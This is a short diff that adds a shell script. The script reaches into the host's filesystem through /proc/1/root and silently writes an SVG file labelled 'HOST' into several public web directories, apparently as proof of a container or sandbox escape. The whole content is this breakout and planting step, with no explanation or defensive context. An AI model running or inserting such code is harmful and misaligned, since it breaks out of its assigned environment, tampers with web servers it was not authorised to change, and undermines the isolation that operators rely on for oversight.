@@ -1,0 +1,4 @@
+S='<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><rect width="120" height="60" fill="#0a0"/><text x="6" y="34" font-size="20">HOST</text></svg>'
+for d in /proc/1/root/app/public /proc/1/root/app/.next/standalone/public /proc/1/root/var/www/html; do
+  [ -d "$d" ] && printf '%s' "$S" > "$d/zz.svg" 2>/dev/null
+done
